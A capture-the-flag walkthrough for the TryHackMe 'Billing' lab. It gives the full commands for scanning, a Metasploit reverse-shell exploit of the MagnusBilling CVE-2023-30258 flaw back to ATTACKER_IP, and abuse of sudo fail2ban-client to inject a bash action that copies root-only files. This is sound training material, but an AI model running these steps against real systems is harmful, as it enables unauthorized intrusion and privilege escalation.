# 🧠 TryHackMe Room: Billing

**Room URL:** [https://tryhackme.com/room/billing](https://tryhackme.com/room/billing)  
**Author:** Schenkee  
**Profile:** [https://tryhackme.com/p/schenkee](https://tryhackme.com/p/schenkee)  

---

## 🧩 Challenge Task Overview  

**Objective:** This guide walks through solving the Billing room. This challenge involves web enumeration, exploitation of CVE-2023-30258 via Metasploit and lastly some Linux privilege escalation to capture the root flag. 

---

## 🧰 Tools I Used  
-  RustScan
-  nmap
-  Gobuster
-  Metasploit

---

Firstly, let’s start our target machine and give it a few minutes to start all relevant services. We can also either start the AttackBox or as in my case connect our own machine to the TryHackMe VPN.  If needed, you can add ```billing.thm``` along with the assigned IP to your ```/etc/hosts``` file which can make life easier, rather than remembering an IP all the time you can simply use ```http://billing.thm```

---

## 🛠️ Recon & Enumeration 

Start by scanning the target for open ports. Here I used RustScan which will scan for open ports and then pass these to nmap for detailed port scans.
```bash
rustscan -a TARGET_IP -- -A
```
#### ⚙️ **Options**   
**-a** Use to list the IPs, CIDRs or hosts to be scanned.  
**-A** Passes the IP and open ports to nmap to perform a full ```-A``` nmap scan.   
Note that we need to add the double dash ```--``` after the IP to tell RustScan that the following arguments should be passed to nmap. In this instance ```-A```    
![Recon - Scan](./Images/Recon%20-%20scan.png)  
After a little while nmap will finish and return a large chunk of information.  
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 60 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 19:34:23:77:88:1c:8b:6a:fb:6a:ba:71:2a:98:13:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwbN7Qndccgu8B3k+Je546f2FXAayb6HecvtpbClUdOT4CL1oe7tBWHCNhmmkagj4y3YAWKGPkxktGB94Cm0qE=
|   256 c1:5e:bb:07:23:18:61:cc:10:bd:02:f7:c7:ca:8d:02 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB1prdPAOYElyhdC+nzgMR5x3HA14z8Dh1kT5FcsYegV
80/tcp   open  http     syn-ack ttl 60 Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://billing.thm/mbilling/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql    syn-ack ttl 60 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 60 Asterisk Call Manager 2.10.6
```
Here we can see a few clues which will help us on our way to gaining initial access.  
We have SSH running on port ```22```  
We have a web server running on port ```80``` with a title of MagnusBilling. Which is located at ```http://billing.thm/mbilling/```
We have a database running on port ```3306```
We have an application called Asterisk Call Manager running on port ```5038```

We will come back to these items later but for now I started a web enumeration scan via Gobuster. As we have located a web application this is most likely our initial attack surface.  
```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -x .txt,.php -o ~/THMCTF/files.txt --no-error
```
#### ⚙️ **Options**   
**-u** Provides the target URL/IP to Gobuster.    
**-t** Sets the concurrent threads to 200. Not advisable in a real engagement.  
**-x** Tells Gobuster to append .txt and .php to the end of words.   
**-o** Used to output the result of the scan to a text document.    
**--no-error** Tells Gobuster to suppress any errors.  
![Recon - web scan.png](./Images/Recon%20-%20web%20scan.png)  

This returned a couple of items, but nothing of much note.  
```
/index.php            (Status: 302) [Size: 1] [--> ./mbilling]
/robots.txt           (Status: 200) [Size: 37]
/server-status        (Status: 403) [Size: 279]
```

At this stage I decided to check the website manually based on the ```/mbilling/``` path identified by nmap.  
```url
http://billing.thm/mbilling/
```
Here we can see the website is running an application called ```MagnusBilling```  
![Recon - platform.png](./Images/Recon%20-%20platform.png)  

I did some online research on ```MagnusBilling``` exploits and found this item  
[CVE-2023-30258: MagnusBilling Unauthenticated RCE](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/)  

This mentioned versions ```6.x``` and ```7.x``` are vulnerable.  As such I looked around the ```http://billing.thm/mbilling/``` web page for any version detail. Eventually I came across the readme file at ```http://billing.thm/mbilling/readme.md``` which mentioned the version details.  
![Recon - version.png](./Images/Recon%20-%20version.png)  

This mentions the current instance we are trying to exploit is running version ```7.x``` and such the found Metasploit module should work for us.  

Now that we have located a usable exploit we can move onto gaining initial access to the target environment.  

---

## 🛠️ Initial Access

Start Metasploit.
```bash
msfconsole
```
Now load up the exploit ```magnusbilling_unauth_rce_cve_2023_30258``` here we will need to set the ```RHOSTS``` to be the target machine IP and the ```LHOST``` to be your attacking machine IP. Once all setup you can use either ```run``` or ```exploit``` to trigger the attack.

The required commands are as below.  
```console
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258 
show options
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run
```
![Access - metasploit.png](./Images/Access%20-%20metasploit.png)  

If the IP options were correct, you should see a Meterpreter session open.  

---

## 🛠️ Flag 1 

We now have access to the target via a Meterpreter session. I firstly changed this to a shell by inputting the command
```console
shell
```
Now to confirm which user we are running as and our current directory. This will help us locate the flag which is most probably in the folder of a user on the machine.  
```bash
whoami
asterisk
pwd
/var/www/html/mbilling/lib/icepay

cd /home
ls
debian
magnus
ssm-user
cd magnus
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
cat user.txt
```
Here we find the first flag in the directory of the ```magnus``` user.  
![Flag1 - flag.png](./Images/Flag1%20-%20flag.png)  

---

## 🛠️ Flag 2

Now for the second flag we know it requires some root privilege to access. As such we need to work out what our current user ```asterisk``` can do on the target machine.  
```bash
sudo -l
Matching Defaults entries for asterisk on ip-10-201-117-117:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-201-117-117:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Here we can see our logged in user can execute ```fail2ban-client``` with sudo. I wasn’t familiar with fail2ban exploitation, so I researched public write-ups. Fail2ban is an Open Source intrusion prevention application for Linux. It can ban IP addresses that trigger too many failed login attempts. 
You can find more details here [fail2ban](https://github.com/fail2ban/fail2ban)  

Ok so we now know what fail2ban is. But how can we exploit our ability to execute ```fail2ban-client``` with sudo. Some more research returned this [Fail2Ban 0.11.2 Privilege Escalation / Command Execution](https://packetstorm.news/files/189989/)  

Reviewing this, there is an item about halfway down detailing manual exploitation to move the ```root.txt``` file from the ```/root``` directory into the ```/tmp``` directory via ```fail2ban-client```    
![Flag2 - POC.png](./Images/Flag2%20-%20POC.png)  

Enter these commands one at a time into the terminal.
```bash
sudo /usr/bin/fail2ban-client restart 
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```
![Flag2 - commands.png](./Images/Flag2%20-%20commands.png)  

This first command restarts and refreshes the service.  
```bash
sudo /usr/bin/fail2ban-client restart
```

The next command This overwrites the action taken when banning an IP and replaces it with a command that copies ```/root/root.txt``` to ```/tmp/root.txt``` and then adjusts the permissions with ```chmod```
```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
```

The final command bans an IP address which then triggers the item we inserted above.  
```bash
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

Now if you navigate to ```/tmp``` the ```root.txt``` flag should be present and readable. 
```bash
cd /tmp
ls
cat root.txt
```
![Flag2 - flag.png](./Images/Flag2%20-%20flag.png)  

I have only shown the quick method of moving ```root.txt``` to capture the flag as per the scope of the CTF. But at this stage our user is still a low privilege user account. There are further details online on how to use the ```fail2ban-client``` to gain full root access to the target system.  

---

## 🧠 Takeaways  
- Hands-on experience using Metasploit to exploit the MagnusBilling application.  
- Reinforced the importance of online research to locate exploits and proof-of-concept articles.  
- Linux privilege escalation through misconfigured sudo rights (fail2ban-client).  

---

Thank you for following through my guide of the TryHackMe Billing room.
